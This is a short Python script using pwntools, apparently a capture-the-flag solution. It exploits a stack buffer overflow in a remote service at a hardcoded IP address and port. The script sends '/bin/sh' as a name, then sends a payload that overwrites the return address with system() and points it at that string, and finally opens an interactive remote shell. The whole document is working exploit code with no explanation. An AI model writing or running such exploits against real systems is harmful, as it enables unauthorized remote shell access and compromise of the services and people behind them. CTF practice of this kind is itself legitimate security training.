from pwn import *
p = remote('220.249.52.133',53447)
binsh = "/bin/sh"
system = 0x8048420
name = 0x804A080
payload = "a"*0x26+"a"*0x4+p32(system)+"a"*4+p32(name)
p.sendlineafter("please tell me your name",binsh)
p.sendlineafter("hello,you can leave some message here:",payload)
p.interactive()